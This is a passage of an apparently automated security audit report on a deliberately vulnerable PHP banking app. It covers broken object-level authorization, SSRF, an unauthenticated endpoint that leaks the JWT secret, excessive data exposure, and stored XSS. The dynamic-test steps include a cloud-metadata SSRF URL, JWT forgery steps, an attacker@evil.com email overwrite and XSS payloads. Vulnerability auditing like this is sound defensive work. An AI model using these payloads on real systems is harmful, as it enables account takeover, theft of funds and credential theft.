- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:48-58
- Fingerprint: 7f87f890fd610dfaefdde443d96f4f4115d15c469a16fe54bfb94d86ea5f54ed

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 31,
  "symbol": "ProfileController::update",
  "input": "JSON body field 'user_id'"
}
```

#### Controls encountered

```
[
  "Input is validated for format via Validator::make (string length, email format, enum for state, regex for postcode) but this does not constitute an authorization/ownership control",
  "Basic authentication is required via AuthMiddleware, but this only proves the caller is *some* authenticated user, not that they own the target record",
  "Email-uniqueness check exists but only prevents collision with an already-used email; it does not prevent overwriting a different, unused email onto the victim's account"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 41,
  "symbol": "User::update",
  "operation": "UPDATE users SET ... WHERE id = ? (id from unchecked body param)"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute the live HTTP endpoint to observe the runtime response, but the source-to-sink data flow is unambiguous and self-contained (no framework-level filtering of body params was found)."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker",
    "PUT /api/profile with attacker-supplied user_id in body",
    "ProfileController::update() trusts body user_id over $auth['user']['id']",
    "User::update($targetUserId, $updateData) executes with no ownership check",
    "Victim's first_name/last_name/email/phone/address overwritten",
    "Attacker leverages altered email for downstream account-takeover (e.g., password reset)"
  ],
  "impact": "Broken object-level authorization lets any logged-in customer overwrite another user's profile fields including email, enabling account-takeover-style abuse via email-based recovery flows.",
  "severity_reasoning": "High: BOLA on a state-mutating endpoint that can be leveraged into full account takeover via email hijacking.",
  "dynamic_test": "As authenticated user, send PUT /api/profile {\"user_id\":<victim id>, \"email\":\"attacker@evil.com\"}; verify victim's email field changed by checking subsequent login/profile lookup for that victim."
}
```

#### Validator reasoning

The candidate is fully substantiated by direct code inspection. Router.php registers `PUT /api/profile` with only `'auth' => true`, which maps to the standard AuthMiddleware (not AdminAuthMiddleware) — i.e., any authenticated user, regardless of role, reaches ProfileController::update(). Inside update(), the code reads `$data = json_decode(file_get_contents('php://input'), true)` (fully attacker-controlled JSON body) and computes `$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];` with zero authorization check verifying that $targetUserId equals the authenticated caller's own id or that the caller has elevated privileges. This $targetUserId is passed straight to `User::update($targetUserId, $updateData)`, which builds and executes `UPDATE users SET ... WHERE id = ?` using the caller-supplied id verbatim. $updateData is built from `array_intersect_key($data, array_flip($allowed))` where allowed fields include email, first_name, last_name, phone, and address fields — all directly attacker-controlled and validated only for format/type (via Validator::make), not for ownership. The email-uniqueness check only compares against the caller's own email ($user['email']), not the victim's, so it does not block cross-account email overwrite as long as the new email isn't already taken. This is a textbook Broken Object Level Authorization (BOLA/IDOR) chain: untrusted body field -> unchecked cast -> direct use as UPDATE WHERE id target, with no ownership or role check anywhere in the call path (verified in both ProfileController.php and Router.php).

## 27. SSRF in ProfileController::avatarProxy via user-supplied URL

- Lead reference: PWNJ-027
- Category: A10
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:65-99
- Fingerprint: e8be89b99f75d884209ea2585e4a86a4ab992900d40fa286e6b87c2b1e73c436

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 66,
  "symbol": "ProfileController::avatarProxy",
  "input": "JSON body field 'url'"
}
```

#### Controls encountered

```
[
  "Endpoint requires an authenticated session (auth=true in router), limiting exploitation to already-authenticated users rather than fully anonymous attackers -- but this is not an effective SSRF control since any registered user can exploit it."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 76,
  "symbol": "file_get_contents",
  "operation": "server-side HTTP fetch of attacker-controlled URL"
}
```

#### Counterevidence

```
[
  "No evidence found of any allow-list, URL parsing/validation, IP-range blocklist, or egress-filtering firewall referenced in this codebase that would neutralize the SSRF.",
  "No sign this is dead/unreachable code -- it is wired into the router and actively used by the front-end avatar-import feature."
]
```

#### Proof gaps

```
[
  "Runtime network egress controls (e.g., firewall rules, cloud security groups) outside the application code could partially mitigate impact in a real deployment, but none are evidenced in this repository so cannot be assumed."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "POST /api/profile/avatar {url:<attacker-chosen>}",
    "ProfileController::avatarProxy() calls file_get_contents($data['url']) with redirect-following, no allow-list",
    "Server issues request to internal/cloud-metadata/localhost target",
    "Response bytes+content-type returned base64-encoded to caller",
    "url persisted to avatar_url for repeat access"
  ],
  "impact": "Authenticated user can force the server to make arbitrary outbound requests to internal-only services (cloud metadata, internal admin endpoints) and exfiltrate the response content through the API, a classic SSRF with data exfiltration.",
  "severity_reasoning": "High: SSRF from an authenticated endpoint with response reflected back to attacker, enabling internal network reconnaissance/exploitation and potential credential/metadata theft.",
  "dynamic_test": "As authenticated user, POST /api/profile/avatar with {\"url\":\"http://169.254.169.254/latest/meta-data/\"} or an internal service URL; inspect response avatar_data (base64) to confirm the server fetched and returned internal content, proving SSRF."
}
```

#### Validator reasoning

The code at ProfileController::avatarProxy (lines 63-107) exactly matches the described vulnerability. It reads a fully attacker-controlled `url` field from the JSON body with no format/host/scheme validation, then calls file_get_contents($data['url'], false, $context) with a stream context that sets follow_location => true. The fetched bytes are base64-encoded and returned to the caller along with a content-type sniffed from response headers, and the raw URL is persisted to the user's avatar_url column. There is no allow-list, no blocking of private/link-local/loopback ranges, no scheme restriction (http/https/file/ftp/gopher wrappers are all accepted by file_get_contents), and follow_location means redirect-based SSRF bypasses are also possible. The route is registered in Router.php ('POST', '/api/profile/avatar', ['handler' => [ProfileController::class, 'avatarProxy'], 'auth' => true]), so it is reachable by any authenticated user — auth is required but does not mitigate SSRF, since the vulnerability is exploitable by any authenticated (even low-privilege) user against internal-only infrastructure (e.g., cloud metadata endpoints, internal admin services, localhost ports). The frontend (public/banking/js/pages/profile.js, api.js) further confirms this is a legitimate, intentionally reachable feature (avatar import), not dead code. The response body directly reflects fetched content back to the client (data:mime;base64,... plus size and source_url), enabling exfiltration of internal service responses through the API, which satisfies the full source-to-sink chain including data exfiltration. No sanitization, IP-range checks, DNS-rebinding protection, or network egress controls are visible anywhere in this file or its call path.

## 28. Unauthenticated /api/health leaks JWT signing secret and DB credentials

- Lead reference: PWNJ-028
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-33
- Fingerprint: 716d68f0d12a8bf7dca0cfffddc3193c34d1ad1efe8cbd11c5324b803e560864

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 33,
  "symbol": "Router::health",
  "input": "none - public GET /api/health"
}
```

#### Controls encountered

```
[
  "None: 'auth' => false explicitly disables both AuthMiddleware and MachineAuthMiddleware for this route",
  "No redaction/masking of jwt_secret or db credentials in the response payload",
  "No environment/debug-mode gate restricting the endpoint to non-production"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 26,
  "symbol": "Response::success",
  "operation": "returns jwt_secret and db credentials in HTTP response body"
}
```

#### Counterevidence

```
[
  "The description notes JWT signature verification may not currently be enforced elsewhere in the app, which slightly reduces (but does not eliminate) the incremental risk of jwt_secret leakage since AdminAuthMiddleware still verifies signatures with this secret, making forged admin tokens a live risk"
]
```

#### Proof gaps

```
[
  "Did not verify runtime contents of config/app.php to confirm jwt_secret/db_user are non-empty in a real deployment, but this does not affect the validity of the code-level vulnerability",
  "Did not trace AdminAuthMiddleware's exact verification logic to double-confirm secret reuse, though this is corroborative rather than essential to the core finding"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health() returns jwt_secret, db_host, db_name, db_user",
    "Attacker forges JWT (user or admin, since AdminAuthMiddleware verifies with same secret)",
    "Forged token accepted, granting user or admin access"
  ],
  "impact": "Public disclosure of jwt_secret (shared with AdminAuthMiddleware) allows forging both regular and admin session tokens plus DB credential reconnaissance.",
  "severity_reasoning": "High: single unauthenticated leak enables both customer and admin token forgery.",
  "dynamic_test": "curl -s https://target/api/health unauthenticated; confirm jwt_secret/db_* returned; use leaked jwt_secret to forge an admin JWT (iss=BankOfEdAdmin) since AdminAuthMiddleware verifies with the same secret, and confirm acceptance on an admin endpoint."
}
```

#### Validator reasoning

The Router.php source confirms the claim precisely. The route table registers '/api/health' with 'auth' => false. In Router::dispatch(), the auth-checking logic only invokes AuthMiddleware::handle() when $requiresAuth === true, or MachineAuthMiddleware::handle() when $requiresAuth === 'machine'; for 'auth' => false, $auth remains null and no authentication/authorization check occurs before call_user_func_array($handler, $args) invokes Router::health(). health() loads config/app.php and returns db_host, db_name, db_user, and jwt_secret verbatim in the Response::success() JSON body, with no redaction, no environment gate (e.g. no check that disables these fields outside of dev/debug mode), and no filtering. Any unauthenticated network client that can reach GET /api/health receives the full JWT signing secret and DB connection details in plaintext JSON. This is a complete, directly observable source (public route, no input needed) to sink (HTTP response body) path with no effective blocking control in the code.

## 29. User::toPublic exposes password_hash and totp_secret to the authenticated client

- Lead reference: PWNJ-029
- Category: API3
- Severity: MEDIUM
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:66-82
- Fingerprint: c24fce19d6f33d5439da7984b26b02789e276dd64b7f35b3f8ffb185d0ee430a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 13,
  "symbol": "ProfileController::show",
  "input": "GET /api/profile"
}
```

#### Controls encountered

```
[
  "[\"AuthMiddleware requires a valid/unrevoked JWT before reaching ProfileController::show, but this only restricts to authenticated callers — it does not filter which fields of the user's own record are exposed\", \"No field-level allow-list or redaction is applied in User::toPublic(), Response::success(), or any controller\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/User.php",
  "line": 66,
  "symbol": "User::toPublic",
  "operation": "returns password_hash and totp_secret in response payload"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exploitability at maximum severity (retrieving another victim's secrets) depends on the separately tracked JWT-forgery bypass; on its own, this finding shows a user's own credential material returned to themselves, which is still a real data-exposure issue but with lower standalone blast radius than the combined scenario described"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with victim's user id (via JWT forgery or BOLA)",
    "GET /api/profile or login/register response",
    "ProfileController::show()/AuthController::login/register call User::toPublic()",
    "toPublic() includes password_hash and totp_secret in returned array",
    "Attacker obtains victim's password hash and TOTP secret",
    "Offline cracking of password / generation of valid TOTP codes"
  ],
  "impact": "Any attacker able to impersonate a victim (e.g. via the JWT bypass) obtains the victim's password hash and raw TOTP secret directly from the profile API, enabling offline password cracking and 2FA bypass.",
  "severity_reasoning": "Medium: sensitive-data over-exposure that materially amplifies other auth-bypass findings into credential theft and 2FA bypass.",
  "dynamic_test": "Forge a JWT for victim's id (using the JWT-signature-bypass finding) and call GET /api/profile; confirm response JSON includes victim's password_hash and totp_secret fields."
}
```

#### Validator reasoning

Verified directly in source. User::toPublic() (BankOfEd-main/src/Models/User.php:68-86) unconditionally includes 'password_hash' => $user['password_hash'] and 'totp_secret' => $user['totp_secret'] in the array it returns. This method is called from:
- AuthController::register (line 42) and AuthController::login (line 73), embedding the result under 'user' in the JSON response
- ProfileController::show (line 14): `Response::success(User::toPublic($auth['user']));` for GET /api/profile
- ProfileController::update (line 60) after a profile update

Response::success() (Helpers/Response.php) performs a raw json_encode of the data array with no field filtering/allow-list, and echoes it directly to the HTTP client. AuthMiddleware::handle() populates $auth['user'] straight from User::findById($payload->sub), which is a full `SELECT * FROM users WHERE id = ?` row containing password_hash and totp_secret fields — confirmed by User::findById's `SELECT *` query. There is no redaction, no allow-list projection, and no output serialization control anywhere in the chain (Response.php, ProfileController.php, AuthController.php) that would strip these two fields before they reach the wire.

This is a concrete, reachable source-to-sink path: any authenticated request to GET /api/profile (or POST /api/auth/login, /api/auth/register, PUT/PATCH profile update) returns the caller's own password_hash and totp_secret in the JSON body. This is a legitimate over-exposure of sensitive data (CWE-200 / API3:2023 Broken Object Property Level Authorization / Excessive Data Exposure) even without depending on the separately-reported JWT forgery bypass — a normal authenticated user viewing their own profile already receives their raw password hash and TOTP secret in the response, which is bad practice and increases blast radius if the response is logged, cached, exposed via XSS, browser extensions, network intermediaries, etc. The JWT-forgery combination described in the report is an additional aggravating factor (allows retrieving another user's secrets), not a prerequisite for the core finding.

No blocking control (auth check, filtering, whitelist projection) exists between the DB read and the JSON response for these two fields.

## 30. Unauthenticated /api/health leaks JWT secret and DB credentials

- Lead reference: PWNJ-030
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-34
- Fingerprint: d40c15aefe3a09c4f91ec3abca113f84cae1243522a9a121504dae459072d687

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22-34
```

#### Controls encountered

```
[
  "None: 'auth' => false explicitly bypasses AuthMiddleware/MachineAuthMiddleware",
  "No environment gating (e.g., no check restricting the endpoint to APP_ENV=development)",
  "No secret redaction/allowlisting of returned config fields in health()"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Route is at least plausibly intended as an ops health-check, suggesting non-malicious original intent, but this does not mitigate the concrete disclosure risk",
  "Admin JWT secret (config/admin.php) is separate from the leaked app jwt_secret, so leakage does not directly grant admin-panel forgery, only regular user session forgery"
]
```

#### Proof gaps

```
[
  "Did not verify at runtime that JWT_SECRET env var is unset in a real deployment (falls back to hardcoded dev secret) vs. actually configured with a strong secret; either way, the code still discloses whatever secret is configured, so this does not change the finding's validity, only the severity nuance of which secret value leaks"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health()",
    "Response reveals jwt_secret, db_host, db_name, db_user",
    "Attacker forges JWT for arbitrary user id",
    "AuthMiddleware accepts forged token -> account takeover"
  ],
  "impact": "Unauthenticated JWT secret and DB credential disclosure enabling full session forgery / account takeover.",
  "severity_reasoning": "High: duplicate critical unauthenticated secret-leak finding leading directly to full account takeover.",
  "dynamic_test": "curl -s https://target/api/health with no Authorization header; confirm jwt_secret and db_* fields returned; forge JWT for arbitrary sub and use against a protected endpoint."
}
```

#### Validator reasoning

Router.php registers GET /api/health with 'auth' => false. In Router::dispatch(), the auth check is only invoked when $requiresAuth === true (AuthMiddleware) or === 'machine' (MachineAuthMiddleware); for false, $auth stays null and the handler is called with no authentication/authorization check whatsoever. The health() handler loads config/app.php and unconditionally returns db_host, db_name, db_user, and jwt_secret in the JSON response via Response::success(). config/app.php's jwt_secret (env JWT_SECRET, falling back to a hardcoded default) is the exact same value used by AuthService::encode() to sign session JWTs and by AuthMiddleware to verify them (grep confirms AuthService::encode and AdminAuthMiddleware/AdminAuthController use $config['jwt_secret'] from the same config array structure). Thus any unauthenticated client can GET /api/health, read jwt_secret, and use it to forge valid HS256 JWTs for arbitrary user ids, achieving full authentication bypass, plus incidental disclosure of DB host/name/user. There is no input validation or secret redaction in the handler, no feature flag gating this behind a debug/non-production environment check, and the route is unconditionally registered in dispatch() with no additional guard. This is a straightforward, fully concrete source(unauthenticated route)-to-sink(JSON response body containing secret) path with no intervening control.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status' => 'ok', 'php_version' => PHP_VERSION,
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host' => $config['db_host'], 'db_name' => $config['db_name'],
        'db_user' => $config['db_user'], 'jwt_secret' => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 31. BOLA: GET /api/transactions/{id} returns any user's transaction without ownership check

- Lead reference: PWNJ-031
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:37-44
- Fingerprint: 71172823674606e8d75652c83e79d3fc4316cc6ab55b3edce7255bedcdb28f1a

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/TransactionController.php:37-44
```

#### Controls encountered

```
[
  "Route requires authentication (auth=true) but this only verifies identity, not object-level authorization over the specific transaction id",
  "No account/user ownership filter is applied anywhere in the call chain (controller, service, or model)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found: sibling methods index(), AccountController::show(), AddressBookController::show() all correctly filter by user id, confirming absence in show() is an inconsistency/bug rather than an intentional design (e.g., admin-only or public endpoint)",
  "No evidence found that transaction ids are non-enumerable (they are auto-increment integers per findById(int $id) signature and INSERT usage), reinforcing exploitability via ID enumeration"
]
```

#### Proof gaps

```
[
  "Did not verify database-level row security or ORM-level global scopes outside the reviewed model file, though Database::getInstance() usage strongly suggests plain PDO with no such scoping layer present anywhere in this codebase",
  "Did not confirm actual transaction ID distribution/predictability in a live environment, though auto-increment integer IDs are the standard assumption for this schema"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions/{id:\\d+} (auth=true)",
    "TransactionController::show()",
    "Transaction::findById() with no ownership check against authenticated user's accounts",
    "Cross-user transaction data disclosed"
  ],
  "impact": "BOLA allowing enumeration of any customer's transaction details (amounts, counterparty BSB/account, FX details) by any authenticated user.",
  "severity_reasoning": "High per candidate: systemic exposure of financial transaction records across the customer base by sequential ID enumeration.",
  "dynamic_test": "As authenticated user, sequentially GET /api/transactions/1, /2, /3... and confirm transactions belonging to other users (different account owners) are returned without error."
}
```

#### Validator reasoning

The route GET /api/transactions/{id:\d+} is registered with auth=true (Router.php:80) and bound to TransactionController::show(). show() takes $auth (the authenticated user context) and $vars (containing the numeric id) but never uses $auth to scope the lookup. It calls Transaction::findById((int)$vars['id']), whose implementation is 'SELECT * FROM transactions WHERE id = ?' with no WHERE clause restricting to accounts owned by the caller. The result is passed directly to Transaction::format() and returned via Response::success(), exposing amount, description, to_bsb, to_account_number, original_currency/amount, exchange_rate, receipt_number, etc. for any transaction record regardless of which user's accounts it belongs to.

This is a textbook BOLA (API1:2023) contrasted directly with sibling code in the same class: index() explicitly takes $userId = $auth['user']['id'] and calls Transaction::findByUser($userId, ...) which joins to the accounts table filtered by a.user_id = ?, and even validates account_id ownership via Account::findByIdAndUser before returning data. show() has no equivalent check — it is missing the ownership filter entirely, not merely relying on an implicit control elsewhere. There is no middleware-level object-scoping (the auth middleware only establishes identity, per the 'auth' => true flag semantics used elsewhere, not object-level authorization), and no secondary check inside TransactionController::show() or Transaction::findById(). Attack path: any authenticated user obtains a valid session/token, then requests GET /api/transactions/{n} for sequential/enumerable numeric IDs belonging to other users' accounts, and receives full transaction details for those records — a direct, reachable, unauthenticated-object-authorization bypass with a concrete source (request path parameter) to sink (raw SQL SELECT * FROM transactions WHERE id=? with no ownership predicate) trace.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);

    if (!$txn) {
        Response::notFound('Transaction not found.');
    }

    Response::success(Transaction::format($txn));
}
// Transaction::findById: 'SELECT * FROM transactions WHERE id = ?' -- no user/account ownership filter
```

## 32. IDOR in transferExternal: no ownership check on source account allows draining other users' accounts

- Lead reference: PWNJ-032
- Category: API1
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:154-160
- Fingerprint: 9c418a2702a8ed087bd92d6fc824df340f33423724b719fcab14ada9b5865fdb

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/TransferService.php:154-160
```

#### Controls encountered

```
[
  "[\"Validator ensures from_account_id is numeric, but performs no ownership/ACL check\", \"Account::findById only checks existence, not ownership (contrast with Account::findByIdAndUser used in transferOwn)\"]\n<parameter name=\"counterevidence\">[\"None found; no ownership check exists anywhere in the transferExternal call path\", \"No middleware or model-layer guard restricts Account::findById results to the authenticated user's accounts\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker user A",
    "POST /api/transfers/external {from_account_id:<victim B's account>, to_bsb, to_account_number}",
    "TransactionController::transferExternal -> TransferService::transferExternal()",
    "Account::findById($fromAccountId) - no ownership/user check (vs findByIdAndUser used elsewhere)",
    "Funds debited from victim B's account, credited to attacker-controlled destination"
  ],
  "impact": "Unauthorized fund transfer out of another user's account: complete IDOR on the funds-movement source-account check, enabling theft of money.",
  "severity_reasoning": "High: direct theft-of-funds vulnerability with acknowledged missing ownership check, critical financial impact.",
  "dynamic_test": "As authenticated user A, POST /api/transfers/external with from_account_id belonging to victim B (obtained e.g. via IDOR account enumeration) and a destination BSB/account controlled by A; confirm funds are debited from B's account and credited to A's target."
}
```

#### Validator reasoning

Confirmed end-to-end IDOR. Route POST /api/transfers/external (Router.php:67) requires auth=true and dispatches to TransactionController::transferExternal, which reads from_account_id directly from the JSON body, validates only that it is numeric (Validator rule 'required|numeric'), casts it to int, and passes it unmodified to TransferService::transferExternal(). Inside that service method, the source account is looked up via Account::findById($fromAccountId) — a lookup by primary key with no user/ownership predicate — in contrast to transferOwn(), which correctly calls Account::findByIdAndUser($fromAccountId, $userId) for both legs. No other check in the intervening code (currency validation, address-book/manual destination resolution, TOTP logic) verifies that $fromAccount belongs to $user['id']. The balance check for external transfers has also been explicitly removed (see 'VULNERABILITY #9' comment), so the debit proceeds via Account::updateBalance regardless of available funds, and a Transaction record is created and committed. This gives any authenticated user a complete, unauthenticated-object-level attack path: submit a valid from_account_id belonging to another customer plus either an address_book_id under the attacker's own control or an arbitrary to_bsb/to_account_number, and funds are debited from the victim account and credited externally/internally under attacker control. The vulnerability is also self-documented in the source with an explicit 'VULNERABILITY #23: IDOR' comment, matching the described root cause precisely.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
```

## 33. Stored DOM XSS: transaction description rendered unescaped in account detail view

- Lead reference: PWNJ-033
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:140
- Fingerprint: 78ad980dbdf3413f7d68e2b1c512b1d04f905c16c7e590d2a7e2e82b5be92451

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/accounts.js:140
```

#### Controls encountered

```
[
  "Validator rule 'string|max:255' limits length but performs no HTML/script sanitization",
  "escapeHtml() utility exists and is correctly used for most other fields, but is absent specifically for tx.description in renderDetailTransactions"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No CSP header enforcement was located in the reviewed files that would block inline event-handler execution (e.g., onerror=) — not a mitigation confirmed present, but noted since it was not affirmatively ruled out either",
  "Recipient-side visibility of the malicious description (i.e., whether the counterparty on transferExternal actually sees the raw description in their own transaction list) was not independently confirmed in this session, but the sender's own account detail view is unambiguously affected regardless"
]
```

#### Proof gaps

```
[
  "Did not exhaustively trace every backend path that serves tx.description (e.g., PaymentController-generated descriptions) to confirm they cannot be forced to raw HTML by other means, though the primary transferOwn/transferExternal path is sufficient on its own to establish exploitability",
  "Did not verify presence/absence of a global CSP meta tag or header across the app that might reduce impact of inline-script-style payloads (script tags via innerHTML don't execute, but event-handler attributes like onerror do, so this is a minor completeness gap, not a blocker)"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker (any authenticated customer)",
    "POST /api/transfers/own or /external with description=<script payload>, validated only as string|max:255",
    "TransferService persists description verbatim to transactions table",
    "Victim (sender or recipient) opens account detail page -> GET /api/accounts/{id}/transactions",
    "accounts.js renderDetailTransactions() concatenates tx.description into innerHTML without escapeHtml",
    "Injected script executes in victim's browser, can read localStorage bankofed_token"
  ],
  "impact": "Stored XSS executes in the victim's authenticated banking session when they view account transaction history, enabling theft of the bankofed_token from localStorage and full account takeover.",
  "severity_reasoning": "High: attacker-controlled field reaches an unescaped DOM sink in another user's authenticated session, enabling session/token theft.",
  "dynamic_test": "As attacker, initiate a transfer (transferOwn/transferExternal) to a victim's account with description = '<img src=x onerror=alert(document.cookie)>'; log in as/simulate victim viewing GET /api/accounts/{id} detail page in browser and confirm script executes via renderDetailTransactions()."
}
```

#### Validator reasoning

The vulnerability is confirmed end-to-end. Server-side: TransactionController::transferOwn/transferExternal validate `description` only as 'string|max:255' (TransactionController.php lines 58, 88) — no HTML stripping/encoding — and persist it verbatim via TransferService -> Transaction model. The value is later returned unmodified by GET /api/transactions (TransactionController::index -> Transaction::format) and GET /api/accounts/{id}. Client-side: BankOfEd.Utils.escapeHtml (utils.js) is a correct HTML-escaping function and is applied to every other transaction field in renderDetailTransactions() (tx.type, tx.original_currency) as well as to fields in renderList/renderDetailHeader (account_name, bsb, account_number, card fields), demonstrating the escaping utility is available and consistently used elsewhere — except for tx.description, which is concatenated directly into the `html` string (`(tx.description || '—')`) that is then assigned via `container.innerHTML = html;`. This is a genuine asymmetric-escaping bug, not a false positive from an overzealous grep: the sink is a real innerHTML assignment reachable via the normal in-app flow (view account detail -> loadTransactions -> renderDetailTransactions). An attacker who can initiate a transfer to any account (own account via transferOwn, or an arbitrary external account/BSB via transferExternal) controls the `description` field and can inject `<img src=x onerror=...>` or similar payloads; execution occurs in the browser of any account holder who views a transaction list containing that transaction (sender and/or receiving account owner, depending on how recipient visibility is implemented), enabling token theft (bankofed_token in localStorage per the description) or other client-side compromise. There is no CSP, DOMPurify, or other mitigating control found in the reviewed files, and no server-side stripping of tags in the Validator rule ('string' rule does not filter HTML). This matches the classic stored DOM-based XSS pattern with a concrete, traceable source (attacker-controlled transfer description) to sink (unescaped innerHTML write) and no effective blocking control identified in-repo.

#### Code evidence

```
txns.forEach(function (tx) {
  ...
  html +=
    '<tr class="tx-row border-b border-slate-50">' +
      '<td class="px-6 py-3.5 text-slate-500 whitespace-nowrap">' + U.formatDate(tx.created_at) + '</td>' +
      '<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +   // NOT escaped
      '<td class="px-6 py-3.5"><span class="capitalize text-slate-500">' + U.escapeHtml(tx.type) + '</span></td>' +
      ...
});
...
container.innerHTML = html;
```

## 34. Stored XSS in admin panel via customer name rendered inside inline event-handler attributes (HTML-entity encoding decoded before JS execution)

- Lead reference: PWNJ-034
- Category: A03
- Severity: HIGH
- Confidence: 82%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87
- Fingerprint: 48ad4e048a1621da87e4fd060adde062a3cb5e80d389d4774206421f5105fee9

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

```
[
  "Exploitation requires the admin to actually click the Delete (or Reset Password, etc.) button rendered with the malicious onclick handler, not merely open/view the customer detail page as the description somewhat loosely implies — this is a real but modest precondition (a plausible admin workflow step, not automatic execution on page load)",
  "The .replace(/'/g,...) dead-code claim is correct only assuming escapeHtml runs first and fully removes all literal quotes, which is true given the order of composition, but it is a secondary/cosmetic detail not affecting exploitability"
]
```

#### Proof gaps

```
[
  "No live-browser dynamic confirmation was performed in this review; the HTML-entity-decode-before-JS-compile behavior for inline event-handler attributes assigned via innerHTML is standard and well documented, but was not empirically re-verified against a specific browser engine in this session",
  "No CSP enforcement was found in the reviewed PHP/middleware code, but client-side or reverse-proxy/CDN-level CSP headers outside the reviewed source tree cannot be fully ruled out"
]
```

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker",
    "POST /api/auth/register with first_name/last_name containing quote-breakout payload (validated only string|max:100)",
    "Record stored in users table",
    "Admin views customer detail page: GET /api/admin/customers/{id}",
    "customers.js renderDetail() builds onclick attribute via escapeHtml().replace() (dead-code fix), assigned via innerHTML",
    "Browser HTML parser decodes &#39; to ' before compiling onclick JS",
    "Injected script executes in admin's session, reads localStorage bankofed_admin_token",
    "Attacker uses stolen admin token for arbitrary admin API actions"
  ],
  "impact": "Unauthenticated self-registration can plant a stored XSS payload that executes in an admin's browser session when viewed, allowing theft of the admin JWT stored in localStorage and full admin panel takeover.",
  "severity_reasoning": "High: unauthenticated attacker can compromise the admin panel entirely via a self-registration field, a severe privilege-escalation path.",
  "dynamic_test": "Register a new customer via POST /api/auth/register with first_name = \"x'); alert(document.cookie); //\"; log in to admin panel as admin and open that customer's detail page; confirm the injected JS executes (alert fires / script runs) in the admin session."
}
```

#### Validator reasoning

